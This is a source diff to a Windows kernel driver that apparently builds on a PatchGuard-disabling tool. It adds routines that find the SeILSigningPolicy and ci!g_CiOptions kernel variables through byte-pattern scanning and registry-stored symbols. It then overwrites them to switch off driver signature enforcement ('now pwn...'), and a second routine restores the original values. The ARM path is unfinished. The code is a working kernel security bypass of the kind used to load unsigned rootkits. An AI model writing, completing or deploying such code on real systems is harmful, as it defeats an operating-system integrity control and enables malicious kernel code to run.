@@ -181,6 +181,12 @@ EXTERN_C static NTSTATUS DispgpHookTinyPatchGuardDpcRoutine();
 
 EXTERN_C static KDEFERRED_ROUTINE DispgpTinyPatchGuardDpcRoutineHookHandler;
 
+EXTERN_C static char *InterpretSeILSigningPolicy(
+	const UCHAR SeILSigningPolicy);
+
+EXTERN_C static NTSTATUS DispgpInitializeGlobalDSEVariables(
+	_In_ const wchar_t *RegistryKey);
+
 ////////////////////////////////////////////////////////////////////////////////
 //
 // variables
@@ -189,6 +195,7 @@ EXTERN_C static KDEFERRED_ROUTINE DispgpTinyPatchGuardDpcRoutineHookHandler;
 // True if PatchGuard has already been disarmed and an unhooking process is
 // necessary when the driver is being unloaded.
 static bool g_DispgpIsAlreadyDisarmed = false;
+static bool g_DispgpIsAlreadyUnsigned = false;
 
 // A registry key name made up of symbol values.
 static wchar_t g_DispgpRegistryKey[200] = {};
@@ -228,6 +235,21 @@ static UCHAR *g_DispgpSelfEncryptAndWaitRoutineEnd = nullptr;
 // selected at the boot time. It is either CcBcbProfiler() on x64 or
 // CcDelayedFlushTimer() on ARM.
 static HookInfo g_DispgpTinyPatchGuardDpcRoutineHookInfo = {};
+
+// 2 pointers to the 2 values related to code signature enforcement
+static UCHAR *g_DispgpSeILSigningPolicy = nullptr;
+#ifdef _AMD64_
+static ULONG *g_Dispgpg_CiOptions = nullptr;
+#else
+static UINT *g_Dispgpg_CiOptions = nullptr;
+#endif
+
+static UCHAR g_bu_DispgpSeILSigningPolicy = 0;
+#ifdef _AMD64_
+static ULONG g_bu_Dispgpg_CiOptions = 0;
+#else
+static UINT g_bu_Dispgpg_CiOptions = 0;
+#endif
 
 ////////////////////////////////////////////////////////////////////////////////
 //
@@ -340,6 +362,106 @@ _Use_decl_annotations_ EXTERN_C NTSTATUS DispgDisablePatchGuard() {
   return status;
 }
 
+ALLOC_TEXT(PAGED, DispgDSETermination)
+_Use_decl_annotations_ EXTERN_C void DispgDSETermination() {
+	PAGED_CODE();
+
+	if (!g_DispgpIsAlreadyUnsigned) {
+		return;
+	}
+
+	LOG_INFO("removing DSE-patches");
+
+	// put original data back
+	*(g_DispgpSeILSigningPolicy) = g_bu_DispgpSeILSigningPolicy;
+	LOG_DEBUG("*g_DispgpSeILSigningPolicy [restored] = %02x (%s)", *g_DispgpSeILSigningPolicy, InterpretSeILSigningPolicy(*g_DispgpSeILSigningPolicy));
+#ifdef _AMD64_
+	*(g_Dispgpg_CiOptions) = g_bu_Dispgpg_CiOptions;
+	LOG_DEBUG("*g_Dispgpg_CiOptions [restored] = %llx", *(g_Dispgpg_CiOptions));
+#else
+	*(g_Dispgpg_CiOptions) = g_bu_Dispgpg_CiOptions;
+	LOG_DEBUG("*g_Dispgpg_CiOptions [restored] = %x", *((UINT*)g_Dispgpg_CiOptions));
+#endif
+
+	LOG_INFO("DSE has been restored.");
+}
+
+// Disable DSE. It requires symbol
+// information stored in the registry.
+_Use_decl_annotations_ EXTERN_C NTSTATUS DispgDisableDSE() {
+
+	// not protected by PatchGuard under w62
+	/*if (!g_DispgpIsAlreadyDisarmed) {
+		LOG_DEBUG("!g_DispgpIsAlreadyDisarmed");
+		return STATUS_REQUEST_CANCELED;
+	}*/
+	if (g_DispgpIsAlreadyUnsigned) {
+		LOG_DEBUG("g_DispgpIsAlreadyUnsigned");
+		return STATUS_REQUEST_CANCELED;
+	}
+
+	// Initialize variables using symbol information.
+	auto status = DispgpInitializeGlobalDSEVariables(g_DispgpRegistryKey);
+	if (!NT_SUCCESS(status)) {
+		return status;
+	}
+	
+#ifdef _AMD64_
+	// dump the pointer
+	LOG_DEBUG("g_DispgpSeILSigningPolicy = %p", g_DispgpSeILSigningPolicy);
+	LOG_DEBUG("g_Dispgpg_CiOptions = %p", g_Dispgpg_CiOptions);
+
+	// backup the data
+	g_bu_DispgpSeILSigningPolicy = *(g_DispgpSeILSigningPolicy);
+	g_bu_Dispgpg_CiOptions = *(g_Dispgpg_CiOptions);
+
+	// dump the data
+	LOG_DEBUG("*g_DispgpSeILSigningPolicy [prae] = %02x (%s)", *g_DispgpSeILSigningPolicy, InterpretSeILSigningPolicy(*g_DispgpSeILSigningPolicy));
+	LOG_DEBUG("*g_Dispgpg_CiOptions [prae] = %llx", *(g_Dispgpg_CiOptions));
+
+	// now pwn...
+	*(g_DispgpSeILSigningPolicy) = (UCHAR)0;
+	// DISABLE_INTEGRITY_CHECKS: = 0
+	// TESTSIGNING: |= 8
+	//*(g_Dispgpg_CiOptions) = (ULONG)0; // use DISABLE_INTEGIRTY_CHECKS' g_CiOptions [seems to be broken on newer builds and causes problems on specific hardware]
+	*(g_Dispgpg_CiOptions) |= (ULONG)8; // also bit-or TESTSIGNING
+	// this is the result of the kernel command-line "[...] /TESTSIGNING"
+
+	// dump the new data
+	LOG_DEBUG("*g_DispgpSeILSigningPolicy [post] = %02x (%s)", *g_DispgpSeILSigningPolicy, InterpretSeILSigningPolicy(*g_DispgpSeILSigningPolicy));
+	LOG_DEBUG("*g_Dispgpg_CiOptions [post] = %llx", *(g_Dispgpg_CiOptions));
+#else
+	// dump the pointer
+	LOG_DEBUG("g_DispgpSeILSigningPolicy = %p", g_DispgpSeILSigningPolicy);
+	LOG_DEBUG("g_Dispgpg_CiOptions = %p", g_Dispgpg_CiOptions);
+
+	// backup the data
+	g_bu_DispgpSeILSigningPolicy = *(g_DispgpSeILSigningPolicy);
+	g_bu_Dispgpg_CiOptions = *(g_Dispgpg_CiOptions);
+
+	// dump the data
+	LOG_DEBUG("*g_DispgpSeILSigningPolicy [prae] = %02x (%s)", *g_DispgpSeILSigningPolicy, InterpretSeILSigningPolicy(*g_DispgpSeILSigningPolicy));
+	LOG_DEBUG("*g_Dispgpg_CiOptions [prae] = %x", *(g_Dispgpg_CiOptions));
+
+	// now pwn
+	*(g_DispgpSeILSigningPolicy) = (UCHAR)0;
+	// DISABLE_INTEGRITY_CHECKS: = 0
+	// TESTSIGNING: |= 8
+	//*(g_Dispgpg_CiOptions) = (UINT)0; // use DISABLE_INTEGIRTY_CHECKS' g_CiOptions [seems to be broken on newer builds and causes problems on specific hardware]
+	*(g_Dispgpg_CiOptions) |= (UINT)8; // also bit-or TESTSIGNING
+	// this is the result of the kernel command-line "[...] /TESTSIGNING"
+
+	// dump the new data
+	LOG_DEBUG("*g_DispgpSeILSigningPolicy [post] = %02x (%s)", *g_DispgpSeILSigningPolicy, InterpretSeILSigningPolicy(*g_DispgpSeILSigningPolicy));
+	LOG_DEBUG("*g_Dispgpg_CiOptions [post] = %x", *(g_Dispgpg_CiOptions));
+#endif
+
+	// Done
+	LOG_INFO("DSE has been disabled.");
+	g_DispgpIsAlreadyUnsigned = true;
+	return status;
+}
+
 ///////////////////////////////////////////////////////////////////////////////
 //
 // Disarming support routines
@@ -369,9 +491,9 @@ _Use_decl_annotations_ EXTERN_C static NTSTATUS DispgpInitializeGlobalVariables(
 
   // Define a list of required symbols, variables to save the value and
   // conditions to determine if it is needed or not.
-  const auto always = []() { return true; };
   const auto ifX64 = []() { return IsX64(); };
-  const auto ifARM = []() { return !IsX64(); };
+  const auto ifARM = []() { return IsARM(); };
+  const auto always = []() { if ((IsX64()) || (IsARM())) { return true; } else { return false; } };
 
   // clang-format off
   const SymbolSet requireSymbols[] = {
@@ -561,10 +683,13 @@ DispgpInitializePatchGuardThreadRoutineRange(UCHAR *HintFunctionAddress) {
     entry++;  // Next entry
     pPatchGuardThreadRoutine =
         reinterpret_cast<UCHAR *>(entry->BeginAddress + base);
+  }
+  else if (IsARM()) {
+	  // On ARM, PatchGuardThreadRoutine has symbol information, so it can
+	  // directly be used.
+	  pPatchGuardThreadRoutine = HintFunctionAddress;
   } else {
-    // On ARM, PatchGuardThreadRoutine has symbol information, so it can
-    // directly be used.
-    pPatchGuardThreadRoutine = HintFunctionAddress;
+	  return STATUS_UNSUCCESSFUL;
   }
 
   // Get a length of the function
@@ -807,6 +932,224 @@ _Use_decl_annotations_ EXTERN_C static TrampolineCode DispgpMakeTrampolineCode(
 
 #endif
 }
+
+ALLOC_TEXT(PAGED, InterpretSeILSigningPolicy)
+_Use_decl_annotations_ EXTERN_C static char *InterpretSeILSigningPolicy(
+const UCHAR SeILSigningPolicy) {
+	switch (SeILSigningPolicy)
+	{
+	case 0:
+		return "unchecked";
+	case 1:
+		return "unsigned";
+	case 4:
+		return "Authenticode";
+	case 6:
+		return "Store";
+	case 7:
+		return "Anti-Malware";
+	case 8:
+		return "Microsoft";
+	case 11:
+		return "Dynamic Code Generation";
+	case 12:
+		return "Windows";
+	case 13:
+		return "Windows Protected Proccess Light";
+	case 14:
+		return "Windows TCB";
+	default:
+		return "<unknown>";
+	}
+}
+
+ALLOC_TEXT(PAGED, DispgpInitializeGlobalDSEVariables)
+_Use_decl_annotations_ EXTERN_C static NTSTATUS DispgpInitializeGlobalDSEVariables(
+const wchar_t *RegistryKey) {
+	PAGED_CODE();
+	auto status = STATUS_UNSUCCESSFUL;
+
+	UCHAR *pSeGetImageRequiredSigningLevel = nullptr;
+	UCHAR *pSeILSigningPolicy = nullptr;
+	UCHAR *pg_CiOptions = nullptr;
+
+#if _AMD64_
+	UCHAR *cmp1 = nullptr;
+	UCHAR *cmp2 = nullptr;
+	INT32 relCMP2;
+#else
+#if _ARM_
+	UCHAR *cmp = nullptr;
+	UCHAR *ldr = nullptr;
+	UINT16 numLDR = 0;
+	UINT16 numCMP = 0;
+	UINT16 refLDR = 0;
+	UCHAR *dcd = nullptr;
+#else
+#error "unknown architecture"
+#endif
+#endif
+
+	// Define a list of required symbols, variables to save the value and
+	// conditions to determine if it is needed or not.
+	const auto ifX64 = []() { return IsX64(); };
+	const auto ifARM = []() { return IsARM(); };
+	const auto always = []() { if ((IsX64()) || (IsARM())) { return true; } else { return false; } };
+
+	// clang-format off
+	const SymbolSet requireSymbols[] = {
+		{
+			L"ntoskrnl!SeGetImageRequiredSigningLevel",
+			&pSeGetImageRequiredSigningLevel, always,
+		},
+		{
+			L"ci!g_CiOptions",
+			&pg_CiOptions, always,
+		},
+	};
+	// clang-format on
+
+	// Load each symbol from the registry if required
+	for (auto &request : requireSymbols) {
+		if (request.IsRequired()) {
+			status =
+				UtilLoadPointerVaule(RegistryKey, request.SymbolName,
+				reinterpret_cast<void **>(request.Variable));
+			if (!NT_SUCCESS(status)) {
+				LOG_ERROR("%ws not found", request.SymbolName);
+				return status;
+			}
+			LOG_DEBUG("%p = %ws", *request.Variable, request.SymbolName);
+		}
+	}
+
+	// FIXME: sorry, no security yet...
+
+	LOG_DEBUG("pSeGetImageRequiredSigningLevel = %p", pSeGetImageRequiredSigningLevel);
+
+#if _AMD64_
+	// find "41 3A D0" ( == "cmp     dl, r8b")
+	for (auto i = 0; i < 0x38; ++i) {
+		if ((*(pSeGetImageRequiredSigningLevel + i) == 0x41) && (*(pSeGetImageRequiredSigningLevel + i + 1) == 0x3A) && (*(pSeGetImageRequiredSigningLevel + i + 2) == 0xD0)) {
+			cmp1 = (pSeGetImageRequiredSigningLevel + i);
+			LOG_DEBUG("cmp1 = SeGetImageRequiredSigningLevel+0x%llx", (cmp1 - pSeGetImageRequiredSigningLevel));
+			break;
+		}
+	}
+	if (cmp1 == nullptr) {
+		LOG_DEBUG("cmp1 == nullptr");
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	// Zielstruktur sieht so aus:
+	/*
+		cmp     dl, r8b					{Length: 3} // often SeGetImageRequiredSigningLevel+0x13
+		jbe     short loc_uninteresting	{Length: 2}
+		cmp     cs:SeILSigningLevel, 4	{Length: 7} // often SeGetImageRequiredSigningLevel+0x18
+	*/
+	
+	// cmp1+0xB should be "04" (= the ", 4" portion of "cmp     cs:SeILSigningLevel, 4")
+	if ((*(cmp1 + 0xB)) == 0x04) {
+		cmp2 = ((cmp1 + 0xB) - 0x6);
+		LOG_DEBUG("cmp2 = SeGetImageRequiredSigningLevel+0x%llx", (cmp2 - pSeGetImageRequiredSigningLevel));
+	}
+	if (cmp2 == nullptr) {
+		LOG_DEBUG("cmp2 == nullptr");
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	// Die cmp-Anweisung sieht wie folgt aus:
+	/*
+		cmp = "80 3D XX XX XX XX YY"
+			XX XX XX XX => relativer Pointer (vom cmp) + 7
+			YY => Vergleichswert
+	*/
+	
+	relCMP2 = (*((INT32*)(cmp2 + 2)));
+	LOG_DEBUG("relCMP2 = 0x%x", relCMP2);
+
+	pSeILSigningPolicy = ((cmp2 + 7) + relCMP2);
+	LOG_DEBUG("pSeILSigningPolicy = %p", pSeILSigningPolicy);
+#else
+#if _ARM_
+	// find "1B 78 04 2B" ( == "LRDB R3, [R3]"; "CMP R3, #4")
+	// 0x38 wird als maximale Größe der ersten Teilfunktion angenommen
+	for (auto i = 0; i < 0x38; ++i) {
+		if ((*(pSeGetImageRequiredSigningLevel + i) == 0x1B) && (*(pSeGetImageRequiredSigningLevel + i + 1) == 0x78) && (*(pSeGetImageRequiredSigningLevel + i + 2) == 0x04) && (*(pSeGetImageRequiredSigningLevel + i + 3) == 0x2B)) {
+			cmp = (pSeGetImageRequiredSigningLevel + i);
+			LOG_DEBUG("cmp = SeGetImageRequiredSigningLevel+0x%x", (cmp - pSeGetImageRequiredSigningLevel));
+			break;
+		}
+	}
+	if (cmp == nullptr) {
+		LOG_DEBUG("cmp == nullptr");
+		return STATUS_UNSUCCESSFUL;
+	}
+	// Zielstruktur sieht so aus:
+	/*
+		LDR             R3, =SeILSigningPolicy		{Length: 2}
+		LDRB            R3, [R3]					{Length: 2}
+		CMP             R3, #4						{Length: 2}
+	*/
+
+	if ((((UINT16)(cmp - 4)) & 0x4800) != 0) {
+		// got my LDR-cmd
+		ldr = (cmp - 2);
+		LOG_DEBUG("ldr = SeGetImageRequiredSigningLevel+0x%x", (ldr - pSeGetImageRequiredSigningLevel));
+		LOG_DEBUG("*(ldr) = %x", (*((UINT16*)&ldr)));
+	}
+
+	numLDR = ((*((UINT16*)&ldr)) ^ 0x4800); // calculate the final diff 1 [^ = XOR]
+	LOG_DEBUG("numLDR = %x", numLDR);
+	numCMP = ((*((UINT16*)&cmp)) ^ 0x2800); // calculate the final diff 2 [^ = XOR]
+	LOG_DEBUG("numCMP = %x", numCMP);
+
+	// verify the register
+	if ((numCMP & 0x00FF) != 0x04) {
+		// not comparing to "#4" ;-(
+		LOG_DEBUG("(numCMP & 0x00FF) != 0x04");
+		return STATUS_UNSUCCESSFUL;
+	}
+	if ((numCMP & 0xFF00) != (numLDR & 0xFF00)) {
+		// not loading the same register, we're comparing against #4
+		LOG_DEBUG("(numCMP & 0xFF00) != (numLDR & 0xFF00)");
+		return STATUS_UNSUCCESSFUL;
+	}
+	refLDR = (numLDR & 0x00FF); // get the xref
+	LOG_DEBUG("refLDR(raw) = 0x%x", refLDR);
+	refLDR = ((refLDR * 0x4) + 0x2 /* size of the LDR-command */);
+	LOG_DEBUG("refLDR(final) = 0x%x", refLDR);
+
+
+	// read DCD command
+	dcd = (ldr + refLDR);
+	LOG_DEBUG("dcd = SeGetImageRequiredSigningLevel+0x%x", (dcd - pSeGetImageRequiredSigningLevel));
+
+	pSeILSigningPolicy = *((UCHAR**)dcd); // read the final offset
+	LOG_DEBUG("pSeILSigningPolicy = %p", pSeILSigningPolicy);
+
+
+	return STATUS_UNSUCCESSFUL; // FIXME
+#else
+#error "unknown architecture"
+#endif
+#endif
+	
+	if ((pSeILSigningPolicy != nullptr) && (pg_CiOptions != nullptr)) {
+		g_DispgpSeILSigningPolicy = pSeILSigningPolicy;
+#if _AMD64_
+		g_Dispgpg_CiOptions = (ULONG*)pg_CiOptions;
+#else
+		g_Dispgpg_CiOptions = (UINT*)pg_CiOptions;
+#endif
+		
+		return STATUS_SUCCESS;
+	}
+	else {
+		return STATUS_DATA_ERROR;
+	}
+}
+
 
 ///////////////////////////////////////////////////////////////////////////////
 //
